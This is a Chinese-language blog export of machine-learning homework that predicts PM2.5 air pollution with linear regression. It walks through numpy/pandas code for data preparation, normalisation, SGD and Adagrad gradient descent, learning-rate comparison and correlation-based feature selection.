<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data_train = data.iloc[:,<span class="number">3</span>:]</span><br><span class="line">data_train = data_train.replace([<span class="string">&#x27;NR&#x27;</span>],[-<span class="number">1</span>])</span><br><span class="line">data2 = np.array(data_train).astype(<span class="built_in">float</span>)</span><br><span class="line">feature_arr = [[] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4320</span>,<span class="number">18</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">        feature_arr[j].extend(data2[i+j])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(feature_arr[<span class="number">1</span>]))</span><br><span class="line"><span class="comment">#5760</span></span><br><span class="line"><span class="comment">#(18, 5760)</span></span><br></pre></td></tr></table></figure>
<p>2.然后在每个feature对应位置中取数据，放入到12*471=5652个数据集中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">471</span>):</span><br><span class="line">        <span class="comment">#12个月每月471天</span></span><br><span class="line">        temp = []</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">            <span class="comment">#每个数据18个paremeter</span></span><br><span class="line">            <span class="keyword">if</span> row == <span class="number">9</span>:</span><br><span class="line">                y_data2.append(feature_arr[row][i*<span class="number">480</span>+j+<span class="number">9</span>])</span><br><span class="line">                <span class="comment">#i月 j小时</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">                temp.append(feature_arr[row][i*<span class="number">480</span>+j+k])</span><br><span class="line">        train_data2.append(temp)</span><br></pre></td></tr></table></figure>
<p>3.添加b的系数1，每12小时取一个数据作为验证集。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(train_data.shape[<span class="number">0</span>]):</span><br><span class="line">    temp = []</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">12</span> == <span class="number">0</span>:</span><br><span class="line">        temp = np.append(train_data2[i],<span class="number">1</span>)</span><br><span class="line">        v_x.append(temp)</span><br><span class="line">        v_y.append(y_data2[i])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        temp = np.append(train_data2[i],<span class="number">1</span>)</span><br><span class="line">        t_x.append(temp)</span><br><span class="line">        t_y.append(y_data2[i])</span><br></pre></td></tr></table></figure>
<h5 id="2-数据归一化处理"><a href="#2-数据归一化处理" class="headerlink" title="2.数据归一化处理"></a>2.数据归一化处理</h5><p>​    为了防止梯度下降过程中出现波动，能够让梯度下降更加迅速，我们将样本集作归一化处理，用每一个feature的值减去feature的均值，然后除以feature的标准差，这样能够让每一个feature区间大致相同，不会出现梯度相差过大的情况。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#归一化</span></span><br><span class="line">feature2 = np.array(feature_arr)</span><br><span class="line">means = np.mean(feature2,axis = <span class="number">1</span>)</span><br><span class="line">std = np.std(feature2,axis=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5760</span>):</span><br><span class="line">        feature2[i][j] = (feature2[i][j]-means[i])/std[i]</span><br></pre></td></tr></table></figure>
<h5 id="3-随机梯度下降（stochastic-gradient-descent，SGD）"><a href="#3-随机梯度下降（stochastic-gradient-descent，SGD）" class="headerlink" title="3.随机梯度下降（stochastic gradient descent，SGD）"></a>3.随机梯度下降（stochastic gradient descent，SGD）</h5><p>​    在每次更新时用1个样本，随机也就是说我们用样本中的一个例子来近似我所有的样本，来调整<em>θ</em>，但是随机梯度下降可能会带来一定的问题，计算得到的并不是准确的一个梯度。但对于最优化问题，凸问题，虽然不是每次迭代得到的损失函数都向着全局最优方向， 但是大的整体的方向是向全局最优解的，最终的结果往往是在全局最优解附近。但是相比于批量梯度，这样的方法更快，更快收敛，虽然不是全局最优，但很多时候是我们可以接受的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Stochastic_iter</span>(<span class="params">t_x,t_y,v_x,v_y,w</span>):</span><br><span class="line">    loss_list2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(iteration):</span><br><span class="line">        temp=np.random.randint(<span class="number">0</span>,t_x.shape[<span class="number">0</span>])</span><br><span class="line">        loss_vector = np.dot(t_x,w)-t_y</span><br><span class="line">        grad = (t_x[temp]*loss_vector[temp])/t_x.shape[<span class="number">0</span>]</span><br><span class="line">        <span class="comment">#print(grad)</span></span><br><span class="line">        w=w-lr*grad</span><br><span class="line">        loss_list2.append(loss(v_x,v_y,w))</span><br><span class="line">    <span class="keyword">return</span> w,loss_list2</span><br></pre></td></tr></table></figure>
<p>​    但是在我们数据样本集的测试中，随机梯度下降不如dagrad的收敛效果，因此我们在最终模型中并未选择随机梯度下降。</p>
<h5 id="4-优化学习率"><a href="#4-优化学习率" class="headerlink" title="4.优化学习率"></a>4.优化学习率</h5><p>​    我测试了5个adagradient的学习率，比较他们的收敛效果，选择一个最优化的learning rate。可以看到在Adagradient情况下首先排除lr=0.01的曲线，然后我们放大局部做进一步的排除。</p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221017191534099.png" alt="image-20221017191534099"></p>
<p>​    可以看到lr=0.5的时候收敛率还是相对慢了一些</p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221017192006029.png" alt="image-20221017192006029"></p>
<p>​    继续放大局部，可以看到在lr=2的时候收敛速度最快，但是在迭代次数很大的情况下，最终训练效果和lr=5,lr=10应该差别不大。</p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221017192255304.png" alt="image-20221017192255304"></p>
<h4 id="梯度下降求解-2"><a href="#梯度下降求解-2" class="headerlink" title="梯度下降求解"></a>梯度下降求解</h4><p>​    我们依然是采用Adagradient作为梯度下降算法进行梯度下降。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Adagradient</span>(<span class="params">t_x,t_y,v_x,v_y,w,lr</span>):</span><br><span class="line">    loss_list = []</span><br><span class="line">    <span class="comment">#损失函数</span></span><br><span class="line">    lr_w = np.zeros(<span class="number">18</span>*<span class="number">9</span>+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(iteration):</span><br><span class="line">        <span class="comment">#求出偏差的数组</span></span><br><span class="line">        loss_v = np.dot(t_x,w)-t_y</span><br><span class="line">        <span class="comment">#print(loss_v.shape[0])</span></span><br><span class="line">        <span class="comment">#求出偏导的数组</span></span><br><span class="line">        grad_w  = (<span class="number">2</span>*np.dot(t_x.T,loss_v))/t_x.shape[<span class="number">0</span>]</span><br><span class="line">        lr_w += grad_w**<span class="number">2</span></span><br><span class="line">        sqrt_v = np.sqrt(lr_w)</span><br><span class="line">        w = w-lr*(grad_w/sqrt_v)</span><br><span class="line">        loss_list.append(loss(v_x,v_y,w))</span><br><span class="line">    <span class="keyword">return</span> w,loss_list</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221018220059705.png" alt="image-20221018220059705" style="zoom: 67%;" /></p>
<h3 id="4-模型优化方向"><a href="#4-模型优化方向" class="headerlink" title="4.模型优化方向"></a>4.模型优化方向</h3><p>​    由于每个月只取了前20天的数据，因此想要按全年连续分割并不成立。可以对预测时间段进行季节分类，每个季度建立不同的训练模型，虽然季节的部分信息已经涵盖在气象观测指数当中，但可能还存在忽略因素，因此按季节划分是理论上可行的。另一个优化方向是增加高次项，提升模型复杂程度，但要防止过拟合现象的产生。</p>
<p>​    我增加了x的平方项，增加维度进行测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">train_data = np.empty([<span class="number">12</span>*<span class="number">471</span>,<span class="number">18</span>*<span class="number">9</span>*<span class="number">2</span>],dtype=<span class="built_in">float</span>)</span><br><span class="line">y_data = np.empty(<span class="number">12</span>*<span class="number">471</span>)</span><br><span class="line"><span class="comment">#轴1是18个feature,轴2是240天24h</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">471</span>):</span><br><span class="line">    <span class="comment">#数据的一共总组数</span></span><br><span class="line">        y_data[i*<span class="number">471</span>+j] = feature_arr[<span class="number">9</span>][i*<span class="number">480</span>+j+<span class="number">9</span>]</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">            train_data[i*<span class="number">471</span>+j][k*<span class="number">9</span>:<span class="number">9</span>*k+<span class="number">9</span>] = feature_arr[k][i*<span class="number">480</span>+j:i*<span class="number">480</span>+j+<span class="number">9</span>]</span><br><span class="line">        train_data[i*<span class="number">471</span>+j][<span class="number">18</span>*<span class="number">9</span>:<span class="number">18</span>*<span class="number">9</span>*<span class="number">2</span>] = np.power(train_data[i*<span class="number">471</span>+j][:<span class="number">18</span>*<span class="number">9</span>],<span class="number">2</span>)</span><br><span class="line">      <span class="comment">#加入平方项</span></span><br><span class="line"><span class="built_in">print</span>(train_data.shape)</span><br><span class="line"><span class="built_in">print</span>(train_data[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(y_data[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(y_data.shape)</span><br></pre></td></tr></table></figure>
<p>​    测试loss的值还是比较高，且收敛的速度比较慢。</p>
<h2 id="结果分析和评估"><a href="#结果分析和评估" class="headerlink" title="结果分析和评估"></a>结果分析和评估</h2><p>​    下面的过程使用训练模型对text进行预测。这里我们选择loss较小的module3进行模型训练，在模型训练时，我们将考虑train-set中的所有数据，利用所有数据生成训练模型。</p>
<p>​    在没有loss计算的情况下，模型的训练速度很快，我适当提高了迭代的轮数，最终训练时间和参数如下。</p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221017195156047.png" alt="image-20221017195156047"></p>
<p>​    下面对data进行预测，我编写了一个预测函数，并将预测结果输入到.csv文件。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">da_t = da.iloc[:,<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(da_t)</span><br><span class="line">da_t = da_t.replace([<span class="string">&#x27;NR&#x27;</span>],[-<span class="number">1</span>])</span><br><span class="line">da2 = np.array(da_t).astype(<span class="built_in">float</span>)</span><br><span class="line"><span class="built_in">print</span>(da2.shape)</span><br><span class="line">predict_data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">240</span>):</span><br><span class="line">    temp = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">        temp.extend(da2[i*<span class="number">18</span>+j])</span><br><span class="line">    temp.extend([<span class="number">1</span>])</span><br><span class="line">    predict_data.append(temp)</span><br><span class="line">p_d = np.array(predict_data)</span><br><span class="line">data_pre = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>:[],</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>:[]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">predict</span>(<span class="params">w,p_d,data_pre</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">240</span>):</span><br><span class="line">        data_pre[<span class="string">&#x27;id&#x27;</span>].append(<span class="string">&#x27;id_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">        data_pre[<span class="string">&#x27;value&#x27;</span>].append(w.dot(p_d[i]))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">240</span>):</span><br><span class="line">        <span class="keyword">if</span> data_pre[<span class="string">&#x27;value&#x27;</span>][j]&lt;<span class="number">0</span>:</span><br><span class="line">            data_pre[<span class="string">&#x27;value&#x27;</span>][j]=<span class="number">0</span></span><br><span class="line">    <span class="comment">#将小于0的数据转化为0</span></span><br><span class="line">    df = pd.DataFrame(data_pre)</span><br><span class="line">    df.to_csv(<span class="string">&#x27;predict.csv&#x27;</span>,mode=<span class="string">&#x27;w&#x27;</span>,index=<span class="literal">False</span>,header=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment">#w采用覆盖，a是追加</span></span><br><span class="line">    <span class="keyword">return</span> data_pre</span><br></pre></td></tr></table></figure>
<p>​    下面展示部分预测数据和预测数据的直观分布。</p>
<p><strong>module3</strong></p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221017202419184.png" alt="image-20221017202419184"><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221017202939765.png" alt="image-20221017202939765"></p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>​    实验中我们采用了多种方式对模型进行了优化，通过对比选择了loss最低的方案进行了建模，并对结果进行了预测。通过这次实验，进一步提升了我对liner Regression方法的认识。并学会使用优化方法提升回归效率，优化feature分布，使回归能够达到更好的效果，在实验中提升知识应用和实作能力。</p>
]]></content>
  </entry>
  <entry>
    <title>机器学习ML1</title>
    <url>/2022/12/08/ML1/</url>
    <content><![CDATA[<h1 id="ML-Homework1"><a href="#ML-Homework1" class="headerlink" title="ML Homework1"></a>ML Homework1</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>​    用 linear regression 预测出空气污染指数(即PM2.5) 的数值，采用多种方式对模型进行优化，提升模型的准确度。</p>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>​    <strong>Host:</strong>win11;kaggle;python3.9</p>
<h2 id="实验方法"><a href="#实验方法" class="headerlink" title="实验方法"></a>实验方法</h2><h3 id="1-Module1"><a href="#1-Module1" class="headerlink" title="1.Module1"></a>1.Module1</h3><p>​        首先准备先从一个比较简单的模型进行入手，这里我们只考虑PM2.5一种参数，并使用传统的梯度下降方式进行求解。</p>
<h4 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h4><p>​        这里我们使用kaggle进行代码编写，首先创建了一个dataset，然后从dataset中读取csv文件作为数据内容，然后我们打印前18行，也就是一天的数据集合。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>]=[<span class="string">&#x27;SimHei&#x27;</span>] <span class="comment">#用来正常显示中文标签</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>]=<span class="literal">False</span> <span class="comment">#用来正常显示</span></span><br><span class="line"></span><br><span class="line">path = <span class="string">&#x27;../input/train111/train.csv&#x27;</span></span><br><span class="line">data = pd.read_csv(path)</span><br><span class="line">data.head(<span class="number">18</span>)</span><br><span class="line"><span class="comment">#使用data.describe()对数据进行统计性的描述</span></span><br><span class="line">data.describe()</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221016162939156.png" alt="image-20221016162939156"></p>
<p>​    可以看到一共有4320条数据，每天18条，也就是一共240天，feature是18。</p>
<p>下面进行训练</p>
<p>1.将一天分为15组，前9个小时对第10个小时的浓度进行预测。</p>
<p>2.首先建立一个x_list，一共有3600 = 15*240组数据。每一组数据中feature=9，也就是PM2.5的9小时数据。</p>
<p>3.y_list就是一位数据，就是PM2.5的实际值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#处理数据，取3-27行</span></span><br><span class="line">data_train = data.iloc[:,<span class="number">3</span>:]</span><br><span class="line">data_train = data_train.replace([<span class="string">&#x27;NR&#x27;</span>],[-<span class="number">1</span>])</span><br><span class="line"><span class="comment">#将RAINFALL中的NR转化为-1</span></span><br><span class="line"><span class="comment">#将表中数据转换为二维数组格式，数据类型为浮点型</span></span><br><span class="line">data2 = np.array(data_train).astype(<span class="built_in">float</span>)</span><br><span class="line"><span class="built_in">print</span>(data2)</span><br><span class="line"><span class="built_in">print</span>(data2.shape[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(data2.shape[<span class="number">1</span>])</span><br><span class="line">x_list = []</span><br><span class="line">y_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4320</span>,<span class="number">18</span>):</span><br><span class="line">    <span class="comment">#遍历每一天的所有数据</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        <span class="comment">#取前15组训练集的开始</span></span><br><span class="line">        x_slide = data2[i:i+<span class="number">18</span>,j:j+<span class="number">9</span>]</span><br><span class="line">        y_slide = data2[i+<span class="number">9</span>,j+<span class="number">9</span>]</span><br><span class="line">        <span class="comment">#y是9小时以后的PM2.5的值</span></span><br><span class="line">        x_list.append(x_slide)</span><br><span class="line">        y_list.append(y_slide)</span><br><span class="line">X = np.array(x_list)</span><br><span class="line">y = np.array(y_list)</span><br><span class="line"><span class="comment">#将x_list和y_list转化为np数组类型</span></span><br><span class="line"><span class="built_in">print</span>(X.shape)</span><br><span class="line"><span class="built_in">print</span>(y.shape)</span><br><span class="line"><span class="comment">#(3600, 18, 9)</span></span><br><span class="line"><span class="comment">#(3600,)</span></span><br></pre></td></tr></table></figure>
<h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>​        这里我们对模型进行一定的优化</p>
<h5 id="1-Regularized-Linear-Regreeion"><a href="#1-Regularized-Linear-Regreeion" class="headerlink" title="1.Regularized Linear Regreeion"></a>1.Regularized Linear Regreeion</h5><p>​        可以引入正则化系数对模型进行优化，能够方式过拟合现象的发生，但是我们训练模型时发现加入正则化系数对损失函数结果影响比较小，由于我们采用线性模型的情况下，feature的指数都是1，不太会出现过拟合现象，因此引入正则化系数意义并不大。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221016171611519.png" alt="image-20221016171611519" style="zoom:67%;" /></p>
<h5 id="2-Cross-Vaildation"><a href="#2-Cross-Vaildation" class="headerlink" title="2.Cross-Vaildation"></a>2.Cross-Vaildation</h5><p>​        通过交叉验证的方式对模型进行训练，在模型中选取一部分数据作为验证集进行处理，通过训练集进行模型的训练，并用验证集计算LOSS损失函数，选择最小的损失率进行全数据的训练。在module1里面，一共存在3600条数据，这里我们选择前3000项数据作为训练集合，后600项数据作为验证集合进行验证。</p>
<h5 id="3-Adagradient"><a href="#3-Adagradient" class="headerlink" title="3.Adagradient"></a>3.Adagradient</h5><p>​    采用动态学习率的情况进行训练，用来解决下降率不均匀的情况，首先是一个较大 的学习率，然后学习率随迭代次数增加逐渐减小。</p>
<p><a href="https://www.cnblogs.com/wry789/p/12988629.html">李宏毅深度学习笔记-Adagrad算法 - yueqiudian - 博客园 (cnblogs.com)</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/1242619-20200529172525755-459858040.png" alt="image-20200529133550548" style="zoom:67%;" /></p>
<p><img src="https://img2020.cnblogs.com/blog/1242619/202005/1242619-20200529172525996-327788208.png" alt="image-20200529133816227" style="zoom:67%;" /></p>
<p>​    $\sigma^t$是之前所有微分均方根，这里能够约掉学习率下降公式中的系数。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/1242619-20200529172526464-1528145217.png" alt="image-20200529134059096" style="zoom:67%;" /></p>
<p>解释：最佳微分其实近似是一次微分和二次微分的比值，而所有梯度的均方根可以近似为二次微分。</p>
<h4 id="梯度下降求解"><a href="#梯度下降求解" class="headerlink" title="梯度下降求解"></a>梯度下降求解</h4><p>​    下面进行梯度下降求解，这里前3000项数据我们选做训练集，后600项数据为验证集计算损失函数。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221016170909834.png" alt="image-20221016170909834" style="zoom:67%;" /></p>
<p>​    这里是传统梯度下降算法的实现公式，其中的m表示训练数据集中数据项的个数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">loss</span>(<span class="params">X,y,w,b</span>):</span><br><span class="line">    loss = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">600</span>):</span><br><span class="line">        loss += (y[<span class="number">3000</span>+i]-(b+np.dot(w,X[i+<span class="number">3000</span>,<span class="number">9</span>,:])))**<span class="number">2</span></span><br><span class="line">    loss/=<span class="number">600</span></span><br><span class="line">    <span class="keyword">return</span> loss</span><br><span class="line"><span class="comment">#这里采用多变量的梯度下降方法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GradientDecent</span>(<span class="params">X,y,w,b</span>):</span><br><span class="line">    reg_rate = <span class="number">0.0001</span> <span class="comment">#正则化系数</span></span><br><span class="line">    <span class="comment">#下面两个比较关键，用来暂时存储w和b，保证w和b是同时进行下降的</span></span><br><span class="line">    grad_b = <span class="number">0</span> </span><br><span class="line">    grad_w = np.zeros(<span class="number">9</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3000</span>):</span><br><span class="line">        grad_b += -<span class="number">2</span>*(y[i]-(b+np.dot(w,X[i,<span class="number">9</span>,:])))</span><br><span class="line">        <span class="comment">#这一步 是更新b的值，将方程求导，然后求内积，这里取的是第i组数组的PM2.5</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            grad_w[j] += -<span class="number">2</span>*(X[i,<span class="number">9</span>,j])*(y[i]-(b+np.dot(w,X[i,<span class="number">9</span>,:])))</span><br><span class="line">            <span class="comment">#这里是对参数w的更新，这里是对9个小时的方程求导    </span></span><br><span class="line">    <span class="comment">#这里是求导以后的，所以不用加上平方</span></span><br><span class="line">    grad_b/=<span class="number">3000</span></span><br><span class="line">    grad_w/=<span class="number">3000</span></span><br><span class="line">    <span class="comment">#print(grad_w)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#下面我们可以加入Regularization正则化系数进行处理</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        grad_w[k] += (reg_rate*w[k])/<span class="number">3000</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> grad_w,grad_b</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GD_iter</span>(<span class="params">X,y,w,b</span>):</span><br><span class="line">    loss_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(iteration):</span><br><span class="line">        <span class="comment">#get the new w_grad and w_grad</span></span><br><span class="line">        grad_w,grad_b = GradientDecent(X,y,w,b)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#update the b and w</span></span><br><span class="line">        b -= lr*grad_b</span><br><span class="line">        w -= lr*grad_w</span><br><span class="line">        loss_list.append(loss(X,y,w,b))</span><br><span class="line">    <span class="keyword">return</span> w,b,loss_list</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​    训练结果如下图所示，在进行10000次迭代的情况下在验证集上最终平均Loss = 41，损失函数下降情况如下图所示。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221016171928681.png" alt="image-20221016171928681"  /></p>
<p>​    在引入正则化系数的情况下进行10000次迭代</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221016172157898.png" alt="image-20221016172157898"></p>
<p>通过Adagradient进行梯度下降</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#采用更加优化的AdaGrad进行梯度下降</span></span><br><span class="line"><span class="comment">#Adagrad是梯度下降的一种改进形式，是包含着学习率下降的方式</span></span><br><span class="line"><span class="comment">#采用一次导数/二次导数的形式，g2之和是二次导数的近似</span></span><br><span class="line"><span class="keyword">def</span>  <span class="title function_">Adagrad</span>(<span class="params">X,y,w,b</span>):</span><br><span class="line">    loss_list = []</span><br><span class="line">    <span class="comment">#损失函数</span></span><br><span class="line">    lr_w = <span class="number">0</span></span><br><span class="line">    lr_b = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(iteration):</span><br><span class="line">        grad_w,grad_b = GradientDecent(X,y,w,b)</span><br><span class="line">        <span class="comment">#这里注意grad_w是一个向量</span></span><br><span class="line">        lr_b =  lr_b+(grad_b**<span class="number">2</span>)</span><br><span class="line">        lr_w = lr_w +(grad_w**<span class="number">2</span>)   </span><br><span class="line">        w = w-(lr/(lr_w**<span class="number">0.5</span>))*grad_w</span><br><span class="line">        <span class="comment">#print(lr/(lr_w**0.5))</span></span><br><span class="line">        b = b-(lr/(lr_b**<span class="number">0.5</span>))*grad_b</span><br><span class="line">        loss_list.append(loss(X,y,w,b))</span><br><span class="line">    <span class="keyword">return</span> w,b,loss_list</span><br></pre></td></tr></table></figure>
<p>可以看到在5000次迭代的情况下，Loss = 38，获得了更好的下降效果。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221016172916467.png" alt="image-20221016172916467"> <a href="train.csv">train.csv</a> </p>
<h4 id="Problem："><a href="#Problem：" class="headerlink" title="Problem："></a>Problem：</h4><p>​    上述模型存在的比较大的问题是时间太长，在5000次下降的情况下都要进行5min以上，不满足3min模型训练的要求，需要进一步在梯度下降算法上进行优化。</p>
<h3 id="2-Module2"><a href="#2-Module2" class="headerlink" title="2.Module2"></a>2.Module2</h3><p>​    module2我们想要考虑更多的parameters,这里对相关变量的相关性进行确定，我们选择相对性相对较高的几个parameters进行数据建模。</p>
<p>​    首先进行数据处理，这里我们把每个参数纵向排列，然后将各个参量列在column中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">train_dict = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> idx, col <span class="keyword">in</span> <span class="built_in">enumerate</span>(data[<span class="string">&#x27;测项&#x27;</span>].unique()):</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">        train_dict[<span class="string">&#x27;date&#x27;</span>] = pd.to_datetime(np.repeat(data[data[<span class="string">&#x27;测项&#x27;</span>] == col][<span class="string">&#x27;日期&#x27;</span>].values, <span class="number">24</span>))</span><br><span class="line">        train_dict[<span class="string">&#x27;hour&#x27;</span>] = pd.to_numeric(np.tile(data[data[<span class="string">&#x27;测项&#x27;</span>] == col].columns[<span class="number">3</span>:],<span class="number">240</span>)) </span><br><span class="line">    <span class="keyword">if</span> col == <span class="string">&#x27;RAINFALL&#x27;</span>:</span><br><span class="line">        tmp_array = data[data[<span class="string">&#x27;测项&#x27;</span>] == col].T.iloc[<span class="number">3</span>:].values.flatten(order=<span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">        tmp_array[tmp_array==<span class="string">&#x27;NR&#x27;</span>] = -<span class="number">1</span></span><br><span class="line">        train_dict[col] = pd.to_numeric(tmp_array)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        train_dict[col] = pd.to_numeric(data[data[<span class="string">&#x27;测项&#x27;</span>] == col].T.iloc[<span class="number">3</span>:].values.flatten(order=<span class="string">&#x27;F&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">train_data = pd.DataFrame(train_dict)</span><br><span class="line">corr = train_data.corr()<span class="comment">#求皮尔森相关系数</span></span><br><span class="line">corr[<span class="string">&#x27;PM2.5&#x27;</span>].sort_values()<span class="comment">#将PM2.5相关系数进行排序</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221016192131205.png" alt="image-20221016192131205" style="zoom:67%;" /></p>
<p>​    可以看到和PM2.5相关性系数比较高的几个，这里我们选择相关性前3的参数进行建模(PM2.5,PM10,NO2)。</p>
